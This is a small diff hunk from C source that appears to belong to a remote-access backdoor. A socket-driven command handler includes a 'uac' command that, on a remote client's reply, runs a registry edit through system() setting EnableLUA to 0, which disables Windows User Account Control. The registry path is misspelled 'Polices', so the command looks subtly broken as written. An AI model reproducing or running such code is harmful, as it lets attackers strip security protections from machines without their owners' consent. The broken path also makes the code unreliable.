@@ -194,7 +194,7 @@ void handle_clients(socket,address)
 		} else if(strcmp(cmd,"uac") == 0) {
 #if defined(_WIN32)
 			send(*socket,"Turn (Off/On)? ",15,0);
-			get_cmd(socket,cmd,sizeof(cmd));
+			get_cmd(socket,address,cmd,sizeof(cmd));
 			if(stricmp(cmd,"Off") == 0) {
 				sprintf(msg,"C:\\Windows\\System32\\cmd.exe /c \"start reg ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Polices\\System /v EnableLUA /t REG_DWORD /d 0x00000000 /f\"");
 				system(msg);
